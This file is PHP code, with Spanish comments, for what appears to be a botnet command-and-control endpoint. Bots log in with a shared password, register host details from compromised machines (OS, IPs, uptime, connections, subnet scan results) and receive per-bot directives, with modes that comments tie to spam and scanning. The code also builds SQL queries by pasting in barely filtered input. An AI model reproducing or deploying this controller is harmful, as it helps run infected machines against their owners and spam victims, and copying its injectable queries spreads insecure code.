<?php
include_once("./conexiondb.php");

//$mySQLlog="logs/sql.log";
//$mySQLlog="/var/log/httpd/sql.log";
//echo exec('whoami'); 
//$mySQLlog="/tmp/webapi/sql.log";

$mySQLlog="/var/www/html/api/sql.log";

//file:///path/to/file.ext
//$fh=fopen($mySQLlog,'w');
//echo $fh;
//fwrite($fh,"Inicio del server"."\n");
//fclose($fh);
			
//include_once("./includes/functions.php");
include_once("./functions.php");

$botinitialpwd=getDBParam("botInitialPwd");
//$botinitialpwd="hola";


//---------------------------------------------------
// sanidad de los parámetros que se reciben desde el exterior

//	$botpwd = filter_var($_GET['botpwd'],FILTER_SANITIZE_MAGIC_QUOTES);
if(empty($_POST['botpwd'])){	
	$botpwd=" ";
}else{
	$botpwd = filter_var($_POST['botpwd'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['status'])){	
	$status=" ";
//	echo "ingreso status";
}else{
	$status = filter_var($_POST['status'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['botid'])){	
	$botid=" ";
}else{
	$botid = filter_var($_POST['botid'],FILTER_SANITIZE_MAGIC_QUOTES);
}


if(empty($_GET['hostname'])){	
	$hostname=" ";
}else{
	$hostname = filter_var($_POST['hostname'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['osname'])){	
	$osname=" ";
}else{
	$osname = filter_var($_POST['osname'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['osversion'])){	
	$osversion=" ";
}else{
	$osversion = filter_var($_POST['osversion'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['osarch'])){	
	$osarch=" ";
}else{
	$osarch = filter_var($_POST['osarch'],FILTER_SANITIZE_MAGIC_QUOTES);
}


if(empty($_POST['hostuptime'])){	
	$hostuptime=" ";
}else{
	$hostuptime = filter_var($_POST['hostuptime'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['hostips'])){	
	$hostips=" ";
}else{
	$hostips = filter_var($_POST['hostips'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['tcpconnections'])){	
	$tcpconnections=" ";
}else{
	$tcpconnections = filter_var($_GET['tcpconnections'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['subnetscan'])){	
	$subnetscan=" ";
}else{
	$subnetscan = filter_var($_POST['subnetscan'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(empty($_POST['SMTPmode'])){	
	$smtpmode=" ";
}else{
	$smtpmode = filter_var($_POST['SMTPmode'],FILTER_SANITIZE_MAGIC_QUOTES);
}

if(getenv("HTTP_X_FORWARDED_FOR")){
	$proxysourceip=getenv("HTTP_X_FORWARDED_FOR");
}else{
	$proxysourceip=null;
}//fin HTTP_X_FORWARDED_FOR


//---------------------------------------------------
if(getenv("REMOTE_ADDR")){
	$sourceip=getenv("REMOTE_ADDR");
}else{
	$sourceip=null;
}//fin HTTP_X_FORWARDED_FOR


//--------------------------------------------------------
//------------------------------------------------------------
//Para debug se muestran los parametros recibidos en pantalla
//echo "sourceip ->".$sourceip."\n";
/*
echo "<br>  recibido botpwd ->".$botpwd;
echo "<br>  status ->".$status;
echo "<br>  botId ->".$botid;
echo "<br>  hostname ->".$hostname;
echo "<br>  osname ->".$osname;
echo "<br>  osversion ->".$osversion;
echo "<br>  osarch ->".$osarch;
echo "<br>  hostuptime ->".$hostuptime;
echo "<br>  hostips ->".$hostips;
echo "<br>  tcpconnections ->".$tcpconnections;
echo "<br>  subnetscan ->".$subnetscan;
echo "<br>  SMTPmode ->".$smtpmode;
echo "<br>  proxysourceip ->".$proxysourceip;
echo "<br>  botInitialPwd ->".$botinitialpwd;
*/
//------------------------------------------------------------

	$currentDirective="ninguna";		
	$initialResponse="start";



if($botpwd===$botinitialpwd){
		
	if($status==="init"){
			$initialResponse="start";
			echo $initialResponse;
	}elseif ($status==="start"){

		$query="SELECT * FROM bots WHERE botid='".$botid."'";

		$result=$connectmysqli->query($query);		

	   if($result->num_rows<1){
			//arranca y carga como bot conectado//
			$smtpmode="smtpmode"; //utilizado por spam
			$tcpconnections="1"; //utilizado por scan
			$query  = "INSERT INTO bots VALUES ('".$botid."','".$status."','".$hostname."','"
			.$osname."','".$osversion."','".$osarch."','".$hostuptime."','".$hostips."','"
			.$sourceip."','".$proxysourceip."','".$smtpmode."','".$tcpconnections."',"."now(),now()".",'".$initialResponse."')";
						
			$result=$connectmysqli->query($query);

		}//mysql_numrows($result)<1

		echo $sourceip; //respónde devolviendo la ip
				
	}elseif ($status==="command"){
		$query="SELECT botid FROM bots WHERE botid='".$botid."'";
		$result=$connectmysqli->query($query);		

	   if($result->num_rows<1){				
			//si no hay filas de ese bot, se lo reinicia
			echo $initialResponse;
		}else{

			$currentDirective=getDBParamBot($botid);
			echo $currentDirective;//			

			$query="UPDATE bots set status='".$status."',hostuptime='".$hostuptime."',sourceip='".$sourceip."',proxysourceip='".$proxysourceip.
			"',smtpmode='".$smtpmode."',lastupdated=NOW(),tcpconnections='".$tcpconnections."' WHERE botid='".$botid."'";

			$result=$connectmysqli->query($query);
						
		}//mysql_numrows($result)<1
	}elseif ($subnetscan !=NULL && $status ==="scan"){

		$query="UPDATE bots set
		status='".$status."',subnetscan='".$subnetscan."',lastupdated=NOW()
		WHERE botid='".$botid."'";

		echo "command";
	}elseif ($status==='spam'){
		echo "command";		
	}else{
		echo "parametro status vino vacio -> null";
		//header("Location: /404.html");
	} 
}elseif ($botpwd != $botinitialpwd){ //|| $botid==null){
//			header("Location: /404.html");
			echo "\n botInitialPwd es distinto del pass o botID es null \n";
}else{
	//codificar algo cuando el assword del bot no está 
	//establecido

}






?>